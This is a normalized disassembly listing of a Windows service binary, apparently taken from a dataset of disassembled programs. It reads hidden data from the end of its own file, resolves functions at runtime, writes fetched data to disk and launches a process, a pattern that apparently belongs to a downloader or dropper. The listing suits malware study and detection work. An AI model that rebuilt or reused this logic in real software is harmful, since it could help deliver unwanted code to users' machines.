push rw-data
push eax
call [ SetServiceStatus@IAT ]
retn 0x4
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] 0x4
call [ SetServiceStatus@IAT ]
retn 0x4
sub_4034f0
push esi
call sub_4035f0
test eax eax
je r-xdata
pop esi
retn
mov esi [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x5
ja r-xdata
push 0x124f80
call esi
jmp r-xdata
push 0x2dc6c0
call esi
jmp r-xdata
jmp [ eax * 4 + jump_table_4035d8 ]
push rw-data
push rw-data
call sub_4025c0
add esp 0x8
test eax eax
jne r-xdata
push 0x200b20
call esi
jmp r-xdata
mov eax [ rw-data ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x7
push eax
call esi
jmp r-xdata
push 0x927c0
call esi
jmp r-xdata
push rw-data
push rw-data
call sub_403810
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push 0xdbba0
call esi
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push rw-data
call sub_402980
add esp 0x8
cmp eax 0xfffffffe
jne r-xdata
push 0x1b7740
call esi
jmp r-xdata
push 0x36ee80
call esi
jmp r-xdata
push 0x16e360
call esi
jmp r-xdata
sub_4035f0
sub esp 0x320
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x20 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x20 ]
xor esi esi
push 0x104
push eax
push esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
call [ GetModuleFileNameA@IAT ]
cmp eax esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
add esp 0x320
retn
push esi
push 0x80
push 0x3
push esi
push 0x1
lea ecx [ esp + 0x34 ]
push 0x80000000
push ecx
mov [ esp + eax + 0x3c ] 0x0
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
push ebx
mov ebx [ SetFilePointer@IAT ]
mov [ esp + 0x18 ] 0x1
or edi 0xffffffff
test ebp ebp
pop ebx
je r-xdata
mov esi [ ReadFile@IAT ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x18 ]
push 0x1
push eax
push ebp
mov [ esp + 0x24 ] 0x0
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
add esp 0x320
retn
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
mov al [ esp + 0x10 ]
je r-xdata
mov esi [ esp + 0x18 ]
inc esi
dec edi
test al al
mov [ esp + 0x18 ] esi
je r-xdata
test al al
je r-xdata
push 0x2
push 0x0
push edi
push ebp
call ebx
cmp eax 0x83
je r-xdata
mov [ esp + 0x20 ] 0x1
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx 0x1
push 0x2
sub ecx eax
push 0x0
push ecx
push ebp
call ebx
cmp eax 0x83
je r-xdata
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x1a ]
push 0x1
push eax
push ebp
mov [ esp + 0x26 ] 0x0
call esi
test eax eax
je r-xdata
movsx ebx [ esp + 0x12 ]
cmp ebx 0x400
mov [ esp + 0x13 ] 0x0
ja r-xdata
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x12c ]
[ edi ]
test ebx ebx
stosb [ edi ]
je r-xdata
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ebx ebx
mov [ esp + ecx + 0x12c ] al
jne r-xdata
jmp r-xdata
mov ecx 0x100
mov edi rw-data
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x12c ]
push rw-data
push eax
call sub_4024b0
add esp 0x8
mov [ eax + rw-data ] bl
mov [ esp + 0x1c ] 0x1
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
lea edx [ esp + 0x18 ]
push 0x1
push edx
push ebp
mov [ esp + 0x24 ] 0x0
call esi
test eax eax
je r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x11 ] 0x0
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x12c ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov al [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
dec ebx
test al al
[ edi ] [ esi ]
je r-xdata
test ebx ebx
jne r-xdata
mov esi [ ReadFile@IAT ]
sub_403810
mov eax [ esp + 0x4 ]
sub esp 0x54
push esi
mov esi [ esp + 0x60 ]
push esi
push eax
call sub_4038c0
add esp 0x8
test eax eax
jne r-xdata
xor ecx ecx
push edi
mov [ esp + 0x8 ] ecx
xor eax eax
mov [ esp + 0xc ] ecx
lea edi [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
lea edx [ esp + 0x8 ]
mov [ esp + 0x14 ] ecx
mov ecx 0x11
[ edi ]
mov [ esp + 0x48 ] ax
lea eax [ esp + 0x18 ]
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push 0x0
mov [ esp + 0x40 ] 0x44
mov [ esp + 0x6c ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
pop edi
jne r-xdata
or eax 0xffffffff
pop esi
add esp 0x54
retn
mov ecx [ esp + 0x4 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
mov eax 0x1
pop esi
add esp 0x54
retn
mov eax 0xfffffffe
pop esi
add esp 0x54
retn
sub_4038c0
sub esp 0x41c
push ebx
push ebp
push esi
mov esi [ LoadLibraryA@IAT ]
push edi
xor edi edi
push rw-data
mov [ esp + 0x18 ] edi
xor ebx ebx
mov [ esp + 0x14 ] edi
mov [ esp + 0x24 ] edi
call esi
mov ebp eax
cmp ebp edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x41c
retn
push rw-data
call esi
mov edi eax
test edi edi
mov [ esp + 0x18 ] edi
je r-xdata
mov esi [ FreeLibrary@IAT ]
push ebp
call esi
test edi edi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push ebp
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push ebx
push ebx
push ebx
push ebx
push rw-data
mov esi eax
call [ rw-data ]
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
test ebx ebx
je r-xdata
push edi
call esi
mov ecx [ esp + 0x430 ]
push ebx
push 0x4000000
push ebx
push ebx
push ecx
push eax
call [ rw-data ]
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x41c
retn
push ebx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x24 ]
push eax
call [ rw-data ]
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov edx [ esp + 0x434 ]
push ebx
push 0x80
push 0x4
push ebx
push 0x2
push 0x40000000
push edx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push eax
call [ rw-data ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x28 ]
mov edx [ esp + 0x1c ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x28 ]
push eax
push 0x400
push ecx
push edx
call [ rw-data ]
test eax eax
je r-xdata
xor ebx ebx
jmp r-xdata
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
lea ecx [ esp + 0x20 ]
push 0x0
push ecx
lea edx [ esp + 0x30 ]
push eax
push edx
push ebx
mov [ esp + eax + 0x3c ] 0x0
mov [ esp + 0x34 ] 0x0
call esi
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
push ebx
call [ CloseHandle@IAT ]
xor ebx ebx
mov [ esp + 0x10 ] 0x0
jmp r-xdata
sub_403a80
sub esp 0x10
xor eax eax
mov [ esp ] rw-data
mov [ esp + 0x4 ] sub_4033e0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
call sub_4031d0
test eax eax
jne r-xdata
lea eax [ esp ]
push eax
call [ StartServiceCtrlDispatcherA@IAT ]
mov eax 0x1
add esp 0x10
retn 0x10
call sub_403220
mov eax 0x1
add esp 0x10
retn 0x10
sub_403b20
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403cd5
cmp [ rw-data ] ebx
jne r-xdata
call sub_403cc0
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403cd2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_403a80
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
mov eax [ esp + 0x4 ]
retn 0x4
sub_4014c0
mov eax [ esp + 0x4 ]
push 0x0
push eax
lea ecx [ esp + 0xc ]
call sub_401010
retn 0x4
sub_4014e0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
lea ecx [ esp + 0x24 ]
call sub_401090
retn 0x10
sub_401510
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x20 ]
call sub_401260
retn 0x10
sub_401530
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_402150
add esp 0xc
retn 0xc
sub_401550
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_4020e0
mov eax [ esp + 0x4 ]
and eax 0xff
mov ecx eax
and eax 0xf
shr ecx 0x4
mov dl [ ecx + rw-data ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] dl
mov al [ eax + rw-data ]
mov [ ecx + 0x1 ] al
retn
sub_4021a0
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_4021c0
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_4021c0
push ??1Init@ios_base@std@@QAE@XZ
call sub_403b0e
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_4021e0
call ??0_Winit@std@@QAE@XZ
jmp sub_402200
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_402200
push ??1_Winit@std@@QAE@XZ
call sub_403b0e
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
sub_403ae2
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_403b0e
push [ esp + 0x4 ]
call sub_403ae2
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_403ca1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403cc0
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403cd2
xor eax eax
retn
sub_403cd5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
